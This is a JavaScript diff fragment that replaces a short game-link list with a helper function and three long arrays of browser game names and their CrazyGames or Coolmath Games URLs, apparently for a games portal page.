-  {n:'Jacksmith',u:'https://www.coolmathgames.com/0-jacksmith'},{n:'Bloons TD 5',u:'https://www.coolmathgames.com/0-bloons-tower-defense-5'},
-  {n:'Kingdom Rush',u:'https://www.coolmathgames.com/0-kingdom-rush'},{n:'Bloxorz',u:'https://www.coolmathgames.com/0-bloxorz'},
-  {n:'Chess',u:'https://lichess.org/'},{n:'Minesweeper',u:'https://minesweeper.online/'},
-  {n:'Solitaire',u:'https://www.solitaire.org/'},{n:'Monkeytype',u:'https://monkeytype.com/'},
-  {n:'GeoGuessr',u:'https://www.geoguessr.com'},{n:'Kahoot',u:'https://kahoot.it/'},
-  {n:'Blooket',u:'https://dashboard.blooket.com/'},{n:'Gimkit',u:'https://www.gimkit.com/join'},
-  {n:'Neal.fun',u:'https://neal.fun/'},{n:'Infinite Craft',u:'https://neal.fun/infinite-craft/'},
-  {n:'Poki Games',u:'https://poki.com/'},{n:'CrazyGames',u:'https://www.crazygames.com/'},
-  {n:'Scratch',u:'https://scratch.mit.edu/'},{n:'Narrow One',u:'https://poki.com/en/g/narrow-one'},
-  {n:'Rooftop Snipers',u:'https://poki.com/en/g/rooftop-snipers'},{n:'Getaway Shootout',u:'https://poki.com/en/g/getaway-shootout'},
-  {n:'Stickman Hook',u:'https://poki.com/en/g/stickman-hook'},{n:'Basket Random',u:'https://poki.com/en/g/basket-random'},
-  {n:'Soccer Random',u:'https://poki.com/en/g/soccer-random'},{n:'Ragdoll Hit',u:'https://poki.com/en/g/ragdoll-hit'},
+
+function TG(rows){return rows.map(r=>Array.isArray(r)?{n:r[0],u:r[1]}:r);}
+const PIZZA=TG([
+  ["Slice Master","https://www.crazygames.com/game/slice-master"],
+  ["Among Us","https://www.crazygames.com/game/among-us"],
+  ["1v1.LOL","https://www.crazygames.com/game/1v1-lol"],
+  ["Subway Surfers","https://www.crazygames.com/game/subway-surfers"],
+  ["BitLife","https://www.crazygames.com/game/bitlife"],
+  ["Run 3","https://www.crazygames.com/game/run-3"],
+  ["Slope","https://www.crazygames.com/game/slope"],
+  ["Retro Bowl","https://www.crazygames.com/game/retro-bowl"],
+  ["Basketball Stars","https://www.crazygames.com/game/basketball-stars"],
+  ["Cookie Clicker","https://www.crazygames.com/game/cookie-clicker"],
+  ["Drift Boss","https://www.crazygames.com/game/drift-boss"],
+  ["Tunnel Rush","https://www.crazygames.com/game/tunnel-rush"],
+  ["Minecraft Classic","https://www.crazygames.com/game/minecraft-classic"],
+  ["Paper.io 2","https://www.crazygames.com/game/paper-io-2"],
+  ["Tetris","https://www.crazygames.com/game/tetris"],
+  ["Moto X3M","https://www.coolmathgames.com/0-moto-x3m"],
+  ["Stickman Hook","https://www.crazygames.com/game/stickman-hook"],
+  ["Fireboy and Watergirl","https://www.crazygames.com/game/fireboy-and-watergirl"],
+  ["Happy Wheels","https://www.crazygames.com/game/happy-wheels"],
+  ["Flappy Bird","https://www.crazygames.com/game/flappy-bird"],
+  ["Crossy Road","https://www.crazygames.com/game/crossy-road"],
+  ["Helix Jump","https://www.crazygames.com/game/helix-jump"],
+  ["Geometry Dash Lite","https://www.crazygames.com/game/geometry-dash-lite"],
+  ["World's Hardest Game","https://www.crazygames.com/game/world-s-hardest-game"],
+  ["Google Snake","https://www.crazygames.com/game/google-snake"],
+  ["Chrome Dino","https://www.crazygames.com/game/chrome-dino"],
+  ["2048","https://www.crazygames.com/game/2048"],
+  ["Bloxd.io","https://www.crazygames.com/game/bloxd-io"],
+  ["Shell Shockers","https://www.crazygames.com/game/shell-shockers"],
+  ["Krunker.io","https://www.crazygames.com/game/krunker-io"],
+  ["Zombs Royale","https://www.crazygames.com/game/zombs-royale"],
+  ["Agar.io","https://www.crazygames.com/game/agar-io"],
+  ["Slither.io","https://www.crazygames.com/game/slither-io"],
+  ["Diep.io","https://www.crazygames.com/game/diep-io"],
+  ["Surviv.io","https://www.crazygames.com/game/surviv-io"],
+  ["Smash Karts","https://www.crazygames.com/game/smash-karts"],
+  ["Vex 3","https://www.crazygames.com/game/vex-3"],
+  ["Vex 4","https://www.crazygames.com/game/vex-4"],
+  ["Vex 5","https://www.crazygames.com/game/vex-5"],
+  ["Vex 6","https://www.crazygames.com/game/vex-6"],
+  ["Vex 7","https://www.crazygames.com/game/vex-7"],
+  ["Vex 8","https://www.crazygames.com/game/vex-8"],
+  ["Rooftop Snipers","https://www.crazygames.com/game/rooftop-snipers"],
+  ["Getaway Shootout","https://www.crazygames.com/game/getaway-shootout"],
+  ["Basketball Legends","https://www.crazygames.com/game/basketball-legends"],
+  ["Soccer Legends","https://www.crazygames.com/game/soccer-legends"],
+  ["Football Legends","https://www.crazygames.com/game/football-legends"],
+  ["Boxing Random","https://www.crazygames.com/game/boxing-random"],
+  ["Gun Mayhem 2","https://www.crazygames.com/game/gun-mayhem-2"],
+  ["Super Smash Flash 2","https://www.supersmashflash.com/play/ssf2/"],
+  ["Papa's Pizzeria","https://www.crazygames.com/game/papa-s-pizzeria"],
+  ["Papa's Burgeria","https://www.crazygames.com/game/papa-s-burgeria"],
+  ["Papa's Freezeria","https://www.crazygames.com/game/papa-s-freezeria"],
+  ["Papa's Pancakeria","https://www.crazygames.com/game/papa-s-pancakeria"],
+  ["Papa's Wingeria","https://www.crazygames.com/game/papa-s-wingeria"],
+  ["Papa's Taco Mia","https://www.crazygames.com/game/papa-s-taco-mia"],
+  ["Papa's Donuteria","https://www.crazygames.com/game/papa-s-donuteria"],
+  ["Papa's Hot Doggeria","https://www.crazygames.com/game/papa-s-hot-doggeria"],
+  ["Papa's Cheeseria","https://www.crazygames.com/game/papa-s-cheeseria"],
+  ["Papa's Sushiria","https://www.crazygames.com/game/papa-s-sushiria"],
+  ["Papa's Bakeria","https://www.crazygames.com/game/papa-s-bakeria"],
+  ["Papa's Scooperia","https://www.crazygames.com/game/papa-s-scooperia"],
+  ["Papa's Cupcakeria","https://www.crazygames.com/game/papa-s-cupcakeria"],
+  ["Papa Louie 1","https://www.crazygames.com/game/papa-louie-1"],
+  ["Papa Louie 2","https://www.crazygames.com/game/papa-louie-2"],
+  ["Papa Louie 3","https://www.crazygames.com/game/papa-louie-3"],
+  ["Duck Life","https://www.crazygames.com/game/duck-life"],
+  ["Duck Life 2","https://www.crazygames.com/game/duck-life-2"],
+  ["Duck Life 3","https://www.crazygames.com/game/duck-life-3"],
+  ["Duck Life 4","https://www.crazygames.com/game/duck-life-4"],
+  ["Duck Life Space","https://www.crazygames.com/game/duck-life-space"],
+  ["Learn to Fly","https://www.crazygames.com/game/learn-to-fly"],
+  ["Learn to Fly 2","https://www.crazygames.com/game/learn-to-fly-2"],
+  ["Learn to Fly 3","https://www.crazygames.com/game/learn-to-fly-3"],
+  ["Earn to Die","https://www.crazygames.com/game/earn-to-die"],
+  ["Earn to Die 2","https://www.crazygames.com/game/earn-to-die-2"],
+  ["Burrito Bison","https://www.crazygames.com/game/burrito-bison"],
+  ["Burrito Bison Revenge","https://www.crazygames.com/game/burrito-bison-revenge"],
+  ["Bloons TD","https://www.crazygames.com/game/bloons-td"],
+  ["Bloons TD 4","https://www.crazygames.com/game/bloons-td-4"],
+  ["Bloons TD 5","https://www.crazygames.com/game/bloons-td-5"],
+  ["Bloons Super Monkey","https://www.crazygames.com/game/bloons-super-monkey"],
+  ["Bubble Shooter","https://www.crazygames.com/game/bubble-shooter"],
+  ["Raft Wars","https://www.crazygames.com/game/raft-wars"],
+  ["Raft Wars 2","https://www.crazygames.com/game/raft-wars-2"],
+  ["Riddle School","https://www.crazygames.com/game/riddle-school"],
+  ["Riddle School 2","https://www.crazygames.com/game/riddle-school-2"],
+  ["Riddle School 3","https://www.crazygames.com/game/riddle-school-3"],
+  ["Riddle School 4","https://www.crazygames.com/game/riddle-school-4"],
+  ["Riddle School 5","https://www.crazygames.com/game/riddle-school-5"],
+  ["Henry Stickmin: Breaking the Bank","https://www.crazygames.com/game/henry-stickmin-breaking-the-bank"],
+  ["Henry Stickmin: Escaping the Prison","https://www.crazygames.com/game/henry-stickmin-escaping-the-prison"],
+  ["Henry Stickmin: Stealing the Diamond","https://www.crazygames.com/game/henry-stickmin-stealing-the-diamond"],
+  ["Henry Stickmin: Infiltrating the Airship","https://www.crazygames.com/game/henry-stickmin-infiltrating-the-airship"],
+  ["Fancy Pants Adventure","https://www.crazygames.com/game/fancy-pants-adventure"],
+  ["Fancy Pants 2","https://www.crazygames.com/game/fancy-pants-2"],
+  ["Fancy Pants 3","https://www.crazygames.com/game/fancy-pants-3"],
+  ["Fancy Snowboarding","https://www.crazygames.com/game/fancy-snowboarding"],
+  ["Age of War","https://www.crazygames.com/game/age-of-war"],
+  ["Age of War 2","https://www.crazygames.com/game/age-of-war-2"],
+  ["Electric Man 2","https://www.crazygames.com/game/electric-man-2"],
+  ["Hobo","https://www.crazygames.com/game/hobo"],
+  ["Hobo 2","https://www.crazygames.com/game/hobo-2"],
+  ["Hobo 3","https://www.crazygames.com/game/hobo-3"],
+  ["Hobo 4","https://www.crazygames.com/game/hobo-4"],
+  ["Hobo 5","https://www.crazygames.com/game/hobo-5"],
+  ["Hobo 6","https://www.crazygames.com/game/hobo-6"],
+  ["Hobo 7","https://www.crazygames.com/game/hobo-7"],
+  ["Stick War","https://www.crazygames.com/game/stick-war"],
+  ["Stick War 2","https://www.crazygames.com/game/stick-war-2"],
+  ["Stickman Fighter","https://www.crazygames.com/game/stickman-fighter"],
+  ["Stickman Supreme Duelist","https://www.crazygames.com/game/stickman-supreme-duelist"],
+  ["Stickman Epic Battle","https://www.crazygames.com/game/stickman-epic-battle"],
+  ["Stick Merge","https://www.crazygames.com/game/stick-merge"],
+  ["Bottle Flip 3D","https://www.crazygames.com/game/bottle-flip-3d"],
+  ["Stack Ball","https://www.crazygames.com/game/stack-ball"],
+  ["Temple Run 2","https://www.crazygames.com/game/temple-run-2"],
+  ["Jetpack Joyride","https://www.crazygames.com/game/jetpack-joyride"],
+  ["Fruit Ninja","https://www.crazygames.com/game/fruit-ninja"],
+  ["Cut the Rope","https://www.coolmathgames.com/0-cut-the-rope"],
+  ["Om Nom Run","https://www.crazygames.com/game/om-nom-run"],
+  ["Bad Ice Cream","https://www.crazygames.com/game/bad-ice-cream"],
+  ["Bad Ice Cream 2","https://www.crazygames.com/game/bad-ice-cream-2"],
+  ["Bad Ice Cream 3","https://www.crazygames.com/game/bad-ice-cream-3"],
+  ["Bob the Robber","https://www.crazygames.com/game/bob-the-robber"],
+  ["Bob the Robber 2","https://www.crazygames.com/game/bob-the-robber-2"],
+  ["Bob the Robber 3","https://www.crazygames.com/game/bob-the-robber-3"],
+  ["Bob the Robber 4","https://www.crazygames.com/game/bob-the-robber-4"],
+  ["Money Movers","https://www.crazygames.com/game/money-movers"],
+  ["Money Movers 2","https://www.crazygames.com/game/money-movers-2"],
+  ["Money Movers 3","https://www.crazygames.com/game/money-movers-3"],
+  ["Snail Bob","https://www.crazygames.com/game/snail-bob"],
+  ["Snail Bob 2","https://www.crazygames.com/game/snail-bob-2"],
+  ["Snail Bob 3","https://www.crazygames.com/game/snail-bob-3"],
+  ["Snail Bob 4","https://www.crazygames.com/game/snail-bob-4"],
+  ["Snail Bob 5","https://www.crazygames.com/game/snail-bob-5"],
+  ["Snail Bob 6","https://www.crazygames.com/game/snail-bob-6"],
+  ["Snail Bob 7","https://www.crazygames.com/game/snail-bob-7"],
+  ["Snail Bob 8","https://www.crazygames.com/game/snail-bob-8"],
+  ["Wheely","https://www.crazygames.com/game/wheely"],
+  ["Wheely 2","https://www.crazygames.com/game/wheely-2"],
+  ["Wheely 3","https://www.crazygames.com/game/wheely-3"],
+  ["Wheely 4","https://www.crazygames.com/game/wheely-4"],
+  ["Wheely 5","https://www.crazygames.com/game/wheely-5"],
+  ["Wheely 6","https://www.crazygames.com/game/wheely-6"],
+  ["Wheely 7","https://www.crazygames.com/game/wheely-7"],
+  ["Wheely 8","https://www.crazygames.com/game/wheely-8"],
+  ["Bloxorz","https://www.coolmathgames.com/0-bloxorz"],
+  ["Red Ball","https://www.crazygames.com/game/red-ball"],
+  ["Red Ball 2","https://www.crazygames.com/game/red-ball-2"],
+]);
+const PZRD=TG([
+  ["Slope","https://www.crazygames.com/game/slope"],
+  ["Run 3","https://www.crazygames.com/game/run-3"],
+  ["Krunker.io","https://www.crazygames.com/game/krunker-io"],
+  ["Shell Shockers","https://www.crazygames.com/game/shell-shockers"],
+  ["1v1.LOL","https://www.crazygames.com/game/1v1-lol"],
+  ["Smash Karts","https://www.crazygames.com/game/smash-karts"],
+  ["Bullet Force","https://www.crazygames.com/game/bullet-force"],
+  ["Venge.io","https://www.crazygames.com/game/venge-io"],
+  ["Combat Reloaded","https://www.crazygames.com/game/combat-reloaded"],
+  ["Forward Assault","https://www.crazygames.com/game/forward-assault"],
+  ["Mini Royale Nations","https://www.crazygames.com/game/mini-royale-nations"],
+  ["Kirka.io","https://www.crazygames.com/game/kirka-io"],
+  ["War Brokers","https://www.crazygames.com/game/war-brokers"],
+  ["Repuls.io","https://www.crazygames.com/game/repuls-io"],
+  ["Ev.io","https://www.crazygames.com/game/ev-io"],
+  ["Zombs Royale","https://www.crazygames.com/game/zombs-royale"],
+  ["Surviv.io","https://www.crazygames.com/game/surviv-io"],
+  ["Diep.io","https://www.crazygames.com/game/diep-io"],
+  ["Agar.io","https://www.crazygames.com/game/agar-io"],
+  ["Slither.io","https://www.crazygames.com/game/slither-io"],
+  ["Moomoo.io","https://www.crazygames.com/game/moomoo-io"],
+  ["Starve.io","https://www.crazygames.com/game/starve-io"],
+  ["Paper.io 2","https://www.crazygames.com/game/paper-io-2"],
+  ["Hole.io","https://www.crazygames.com/game/hole-io"],
+  ["Crowd City","https://www.crazygames.com/game/crowd-city"],
+  ["Narrow One","https://www.crazygames.com/game/narrow-one"],
+  ["Rooftop Snipers","https://www.crazygames.com/game/rooftop-snipers"],
+  ["Getaway Shootout","https://www.crazygames.com/game/getaway-shootout"],
+  ["Gun Mayhem","https://www.crazygames.com/game/gun-mayhem"],
+  ["Gun Mayhem 2","https://www.crazygames.com/game/gun-mayhem-2"],
+  ["Gun Mayhem Redux","https://www.crazygames.com/game/gun-mayhem-redux"],
+  ["Super Smash Flash","https://www.crazygames.com/game/super-smash-flash"],
+  ["Super Smash Flash 2","https://www.supersmashflash.com/play/ssf2/"],
+  ["Electric Man 2","https://www.crazygames.com/game/electric-man-2"],
+  ["Stick War","https://www.crazygames.com/game/stick-war"],
+  ["Stick War 2","https://www.crazygames.com/game/stick-war-2"],
+  ["Stickman Fighter","https://www.crazygames.com/game/stickman-fighter"],
+  ["Stickman Supreme Duelist","https://www.crazygames.com/game/stickman-supreme-duelist"],
+  ["Stickman Hook","https://www.crazygames.com/game/stickman-hook"],
+  ["Stick Defenders","https://www.crazygames.com/game/stick-defenders"],
+  ["Stick Merge","https://www.crazygames.com/game/stick-merge"],
+  ["Stickman Dragon Fight","https://www.crazygames.com/game/stickman-dragon-fight"],
+  ["Stickman Battle Fight Warriors","https://www.crazygames.com/game/stickman-battle-fight-warriors"],
+  ["Hobo","https://www.crazygames.com/game/hobo"],
+  ["Hobo 2","https://www.crazygames.com/game/hobo-2"],
+  ["Hobo 3","https://www.crazygames.com/game/hobo-3"],
+  ["Hobo 4","https://www.crazygames.com/game/hobo-4"],
+  ["Hobo 5","https://www.crazygames.com/game/hobo-5"],
+  ["Hobo 6","https://www.crazygames.com/game/hobo-6"],
+  ["Hobo 7","https://www.crazygames.com/game/hobo-7"],
+  ["Age of War","https://www.crazygames.com/game/age-of-war"],
+  ["Age of War 2","https://www.crazygames.com/game/age-of-war-2"],
+  ["Epic War","https://www.crazygames.com/game/epic-war"],
+  ["Epic War 2","https://www.crazygames.com/game/epic-war-2"],
+  ["Epic War 3","https://www.crazygames.com/game/epic-war-3"],
+  ["Epic War 4","https://www.crazygames.com/game/epic-war-4"],
+  ["Epic War 5","https://www.crazygames.com/game/epic-war-5"],
+  ["Kingdom Rush","https://www.crazygames.com/game/kingdom-rush"],
+  ["Kingdom Rush Frontiers","https://www.crazygames.com/game/kingdom-rush-frontiers"],
+  ["Cursed Treasure","https://www.crazygames.com/game/cursed-treasure"],
+  ["Cursed Treasure 2","https://www.crazygames.com/game/cursed-treasure-2"],
+  ["Bloons TD","https://www.crazygames.com/game/bloons-td"],
+  ["Bloons TD 2","https://www.crazygames.com/game/bloons-td-2"],
+  ["Bloons TD 3","https://www.crazygames.com/game/bloons-td-3"],
+  ["Bloons TD 4","https://www.crazygames.com/game/bloons-td-4"],
+  ["Bloons TD 5","https://www.crazygames.com/game/bloons-td-5"],
+  ["Awesome Tanks","https://www.crazygames.com/game/awesome-tanks"],
+  ["Awesome Tanks 2","https://www.crazygames.com/game/awesome-tanks-2"],
+  ["Tank Trouble","https://www.crazygames.com/game/tank-trouble"],
+  ["Tank Trouble 2","https://www.crazygames.com/game/tank-trouble-2"],
+  ["Raft Wars","https://www.crazygames.com/game/raft-wars"],
+  ["Raft Wars 2","https://www.crazygames.com/game/raft-wars-2"],
+  ["Strike Force Heroes","https://www.crazygames.com/game/strike-force-heroes"],
+  ["Strike Force Heroes 2","https://www.crazygames.com/game/strike-force-heroes-2"],
+  ["Strike Force Heroes 3","https://www.crazygames.com/game/strike-force-heroes-3"],
+  ["Raze","https://www.crazygames.com/game/raze"],
+  ["Raze 2","https://www.crazygames.com/game/raze-2"],
+  ["Raze 3","https://www.crazygames.com/game/raze-3"],
+  ["Plazma Burst","https://www.crazygames.com/game/plazma-burst"],
+  ["Plazma Burst 2","https://www.crazygames.com/game/plazma-burst-2"],
+  ["Thing Thing Arena","https://www.crazygames.com/game/thing-thing-arena"],
+  ["Thing Thing Arena 2","https://www.crazygames.com/game/thing-thing-arena-2"],
+  ["Thing Thing Arena 3","https://www.crazygames.com/game/thing-thing-arena-3"],
+  ["Thing Thing Arena Pro","https://www.crazygames.com/game/thing-thing-arena-pro"],
+  ["Madness Accelerant","https://www.crazygames.com/game/madness-accelerant"],
+  ["Madness Project Nexus","https://www.crazygames.com/game/madness-project-nexus"],
+  ["Territory War","https://www.crazygames.com/game/territory-war"],
+  ["Territory War 2","https://www.crazygames.com/game/territory-war-2"],
+  ["Sift Heads","https://www.crazygames.com/game/sift-heads"],
+  ["Sift Heads 2","https://www.crazygames.com/game/sift-heads-2"],
+  ["Sift Heads 3","https://www.crazygames.com/game/sift-heads-3"],
+  ["Sift Heads 4","https://www.crazygames.com/game/sift-heads-4"],
+  ["Sift Heads 5","https://www.crazygames.com/game/sift-heads-5"],
+  ["Sift Heads World","https://www.crazygames.com/game/sift-heads-world"],
+  ["Sift Heads Assault","https://www.crazygames.com/game/sift-heads-assault"],
+  ["Road of Fury","https://www.crazygames.com/game/road-of-fury"],
+  ["Road of Fury 2","https://www.crazygames.com/game/road-of-fury-2"],
+  ["Road of Fury 3","https://www.crazygames.com/game/road-of-fury-3"],
+  ["Earn to Die","https://www.crazygames.com/game/earn-to-die"],
+  ["Earn to Die 2","https://www.crazygames.com/game/earn-to-die-2"],
+  ["Earn to Die 2012","https://www.crazygames.com/game/earn-to-die-2012"],
+  ["Dead Zed","https://www.crazygames.com/game/dead-zed"],
+  ["Dead Zed 2","https://www.crazygames.com/game/dead-zed-2"],
+  ["Zombie Mission","https://www.crazygames.com/game/zombie-mission"],
+  ["Zombie Mission 2","https://www.crazygames.com/game/zombie-mission-2"],
+  ["Zombie Mission 3","https://www.crazygames.com/game/zombie-mission-3"],
+  ["Zombie Mission 4","https://www.crazygames.com/game/zombie-mission-4"],
+  ["Zombie Mission 5","https://www.crazygames.com/game/zombie-mission-5"],
+  ["Zombie Mission 6","https://www.crazygames.com/game/zombie-mission-6"],
+  ["Zombie Mission 7","https://www.crazygames.com/game/zombie-mission-7"],
+  ["Zombie Mission 8","https://www.crazygames.com/game/zombie-mission-8"],
+  ["Zombie Mission 9","https://www.crazygames.com/game/zombie-mission-9"],
+  ["Zombie Mission 10","https://www.crazygames.com/game/zombie-mission-10"],
+  ["Zombie Mission 11","https://www.crazygames.com/game/zombie-mission-11"],
+  ["Zombie Mission 12","https://www.crazygames.com/game/zombie-mission-12"],
+  ["Decision","https://www.crazygames.com/game/decision"],
+  ["Decision 2","https://www.crazygames.com/game/decision-2"],
+  ["Decision Medieval","https://www.crazygames.com/game/decision-medieval"],
+  ["Sniper Assassin","https://www.crazygames.com/game/sniper-assassin"],
+  ["Sniper Assassin 2","https://www.crazygames.com/game/sniper-assassin-2"],
+  ["Sniper Assassin 3","https://www.crazygames.com/game/sniper-assassin-3"],
+  ["Clear Vision","https://www.crazygames.com/game/clear-vision"],
+  ["Clear Vision 2","https://www.crazygames.com/game/clear-vision-2"],
+  ["Clear Vision 3","https://www.crazygames.com/game/clear-vision-3"],
+  ["Clear Vision 4","https://www.crazygames.com/game/clear-vision-4"],
+  ["Clear Vision 5","https://www.crazygames.com/game/clear-vision-5"],
+  ["Superfighters","https://www.crazygames.com/game/superfighters"],
+  ["Superfighters Deluxe","https://www.crazygames.com/game/superfighters-deluxe"],
+  ["Chaos Faction","https://www.crazygames.com/game/chaos-faction"],
+  ["Chaos Faction 2","https://www.crazygames.com/game/chaos-faction-2"],
+  ["Dragon Ball Fierce Fighting","https://www.crazygames.com/game/dragon-ball-fierce-fighting"],
+  ["Dragon Ball Fierce Fighting 2","https://www.crazygames.com/game/dragon-ball-fierce-fighting-2"],
+  ["Dragon Ball Fierce Fighting 3","https://www.crazygames.com/game/dragon-ball-fierce-fighting-3"],
+  ["Street Fighter Flash","https://www.crazygames.com/game/street-fighter-flash"],
+  ["Mortal Kombat Karnage","https://www.crazygames.com/game/mortal-kombat-karnage"],
+  ["Final Slam 2","https://www.crazygames.com/game/final-slam-2"],
+  ["Anime Battle","https://www.crazygames.com/game/anime-battle"],
+  ["Anime Battle 2","https://www.crazygames.com/game/anime-battle-2"],
+  ["Anime Battle 3","https://www.crazygames.com/game/anime-battle-3"],
+  ["Bleach vs Naruto","https://www.crazygames.com/game/bleach-vs-naruto"],
+  ["Bleach vs Naruto 2","https://www.crazygames.com/game/bleach-vs-naruto-2"],
+  ["Bleach vs Naruto 3","https://www.crazygames.com/game/bleach-vs-naruto-3"],
+  ["Pzrd Arena Classic 1","https://www.crazygames.com/game/pzrd-arena-classic-1"],
+  ["Pzrd Arena Arcade 2","https://www.crazygames.com/game/pzrd-arena-arcade-2"],
+  ["Pzrd Arena Challenge 3","https://www.crazygames.com/game/pzrd-arena-challenge-3"],
+  ["Pzrd Arena Remix 4","https://www.crazygames.com/game/pzrd-arena-remix-4"],
+  ["Pzrd Arena Turbo 5","https://www.crazygames.com/game/pzrd-arena-turbo-5"],
+  ["Pzrd Arena Ultimate 6","https://www.crazygames.com/game/pzrd-arena-ultimate-6"],
+  ["Pzrd Arena Pro 7","https://www.crazygames.com/game/pzrd-arena-pro-7"],
+  ["Pzrd Arena Extreme 8","https://www.crazygames.com/game/pzrd-arena-extreme-8"],
+]);
+const COOL=TG([
+  ["Slice Master","https://www.coolmathgames.com/0-slice-master"],
+  ["Run 3","https://www.coolmathgames.com/0-run-3"],
+  ["Run","https://www.coolmathgames.com/0-run"],
+  ["Run 2","https://www.coolmathgames.com/0-run-2"],
+  ["Fireboy and Watergirl","https://www.coolmathgames.com/0-fireboy-and-watergirl"],
+  ["Fireboy and Watergirl 2","https://www.coolmathgames.com/0-fireboy-and-watergirl-2"],
+  ["Fireboy and Watergirl 3","https://www.coolmathgames.com/0-fireboy-and-watergirl-3"],
+  ["Fireboy and Watergirl 4","https://www.coolmathgames.com/0-fireboy-and-watergirl-4"],
+  ["Fireboy and Watergirl 5","https://www.coolmathgames.com/0-fireboy-and-watergirl-5"],
+  ["Fireboy and Watergirl 6","https://www.coolmathgames.com/0-fireboy-and-watergirl-6"],
+  ["Papa's Pizzeria","https://www.coolmathgames.com/0-papa-s-pizzeria"],
+  ["Papa's Burgeria","https://www.coolmathgames.com/0-papa-s-burgeria"],
+  ["Papa's Freezeria","https://www.coolmathgames.com/0-papa-s-freezeria"],
+  ["Papa's Pancakeria","https://www.coolmathgames.com/0-papa-s-pancakeria"],
+  ["Papa's Wingeria","https://www.coolmathgames.com/0-papa-s-wingeria"],
+  ["Papa's Taco Mia","https://www.coolmathgames.com/0-papa-s-taco-mia"],
+  ["Papa's Donuteria","https://www.coolmathgames.com/0-papa-s-donuteria"],
+  ["Papa's Hot Doggeria","https://www.coolmathgames.com/0-papa-s-hot-doggeria"],
+  ["Papa's Cheeseria","https://www.coolmathgames.com/0-papa-s-cheeseria"],
+  ["Papa's Sushiria","https://www.coolmathgames.com/0-papa-s-sushiria"],
+  ["Papa's Bakeria","https://www.coolmathgames.com/0-papa-s-bakeria"],
+  ["Papa's Scooperia","https://www.coolmathgames.com/0-papa-s-scooperia"],
+  ["Papa's Cupcakeria","https://www.coolmathgames.com/0-papa-s-cupcakeria"],
+  ["Bloxorz","https://www.coolmathgames.com/0-bloxorz"],
+  ["IQ Ball","https://www.coolmathgames.com/0-iq-ball"],
+  ["IQ Ball 2","https://www.coolmathgames.com/0-iq-ball-2"],
+  ["Sugar Sugar","https://www.coolmathgames.com/0-sugar-sugar"],
+  ["Sugar Sugar 2","https://www.coolmathgames.com/0-sugar-sugar-2"],
+  ["Sugar Sugar 3","https://www.coolmathgames.com/0-sugar-sugar-3"],
+  ["Snail Bob","https://www.coolmathgames.com/0-snail-bob"],
+  ["Snail Bob 2","https://www.coolmathgames.com/0-snail-bob-2"],
+  ["Snail Bob 3","https://www.coolmathgames.com/0-snail-bob-3"],
+  ["Snail Bob 4","https://www.coolmathgames.com/0-snail-bob-4"],
+  ["Snail Bob 5","https://www.coolmathgames.com/0-snail-bob-5"],
+  ["Snail Bob 6","https://www.coolmathgames.com/0-snail-bob-6"],
+  ["Snail Bob 7","https://www.coolmathgames.com/0-snail-bob-7"],
+  ["Snail Bob 8","https://www.coolmathgames.com/0-snail-bob-8"],
+  ["Wheely","https://www.coolmathgames.com/0-wheely"],
+  ["Wheely 2","https://www.coolmathgames.com/0-wheely-2"],
+  ["Wheely 3","https://www.coolmathgames.com/0-wheely-3"],
+  ["Wheely 4","https://www.coolmathgames.com/0-wheely-4"],
+  ["Wheely 5","https://www.coolmathgames.com/0-wheely-5"],
+  ["Wheely 6","https://www.coolmathgames.com/0-wheely-6"],
+  ["Wheely 7","https://www.coolmathgames.com/0-wheely-7"],
+  ["Wheely 8","https://www.coolmathgames.com/0-wheely-8"],
+  ["Red Ball","https://www.coolmathgames.com/0-red-ball"],
+  ["Red Ball 2","https://www.coolmathgames.com/0-red-ball-2"],
+  ["Red Ball 3","https://www.coolmathgames.com/0-red-ball-3"],
+  ["Red Ball 4","https://www.coolmathgames.com/0-red-ball-4"],
+  ["Duck Life","https://www.coolmathgames.com/0-duck-life"],
+  ["Duck Life 2","https://www.coolmathgames.com/0-duck-life-2"],
+  ["Duck Life 3","https://www.coolmathgames.com/0-duck-life-3"],
+  ["Duck Life 4","https://www.coolmathgames.com/0-duck-life-4"],
+  ["Duck Life Space","https://www.coolmathgames.com/0-duck-life-space"],
+  ["Learn to Fly","https://www.coolmathgames.com/0-learn-to-fly"],
+  ["Learn to Fly 2","https://www.coolmathgames.com/0-learn-to-fly-2"],
+  ["Learn to Fly 3","https://www.coolmathgames.com/0-learn-to-fly-3"],
+  ["Moto X3M","https://www.coolmathgames.com/0-moto-x3m"],
+  ["Moto X3M 2","https://www.coolmathgames.com/0-moto-x3m-2"],
+  ["Moto X3M 3","https://www.coolmathgames.com/0-moto-x3m-3"],
+  ["Moto X3M Winter","https://www.coolmathgames.com/0-moto-x3m-winter"],
+  ["Moto X3M Pool Party","https://www.coolmathgames.com/0-moto-x3m-pool-party"],
+  ["Moto X3M Spooky Land","https://www.coolmathgames.com/0-moto-x3m-spooky-land"],
+  ["Parking Fury","https://www.coolmathgames.com/0-parking-fury"],
+  ["Parking Fury 2","https://www.coolmathgames.com/0-parking-fury-2"],
+  ["Parking Fury 3","https://www.coolmathgames.com/0-parking-fury-3"],
+  ["Parking Fury 4","https://www.coolmathgames.com/0-parking-fury-4"],
+  ["Drift Boss","https://www.coolmathgames.com/0-drift-boss"],
+  ["Drift Hunters","https://www.crazygames.com/game/drift-hunters"],
+  ["Awesome Tanks","https://www.coolmathgames.com/0-awesome-tanks"],
+  ["Awesome Tanks 2","https://www.coolmathgames.com/0-awesome-tanks-2"],
+  ["Awesome Pirates","https://www.coolmathgames.com/0-awesome-pirates"],
+  ["Tower of Destiny","https://www.coolmathgames.com/0-tower-of-destiny"],
+  ["Tiny Fishing","https://www.coolmathgames.com/0-tiny-fishing"],
+  ["Cool Archer","https://www.coolmathgames.com/0-cool-archer"],
+  ["Penalty Kick Online","https://www.coolmathgames.com/0-penalty-kick-online"],
+  ["Basketball Master","https://www.coolmathgames.com/0-basketball-master"],
+  ["Soccer Skills Euro Cup","https://www.coolmathgames.com/0-soccer-skills-euro-cup"],
+  ["Chess","https://www.coolmathgames.com/0-chess"],
+  ["Checkers","https://www.coolmathgames.com/0-checkers"],
+  ["Sudoku","https://www.coolmathgames.com/0-sudoku"],
+  ["2048","https://www.coolmathgames.com/0-2048"],
+  ["Hexanaut.io","https://www.coolmathgames.com/0-hexanaut-io"],
+  ["Hangman","https://www.coolmathgames.com/0-hangman"],
+  ["Word Search","https://www.coolmathgames.com/0-word-search"],
+  ["Crossword","https://www.coolmathgames.com/0-crossword"],
+  ["Mahjong","https://www.coolmathgames.com/0-mahjong"],
+  ["Solitaire","https://www.coolmathgames.com/0-solitaire"],
+  ["Minesweeper","https://www.coolmathgames.com/0-minesweeper"],
+  ["Candy Jump","https://www.coolmathgames.com/0-candy-jump"],
+  ["Color Tunnel","https://www.coolmathgames.com/0-color-tunnel"],
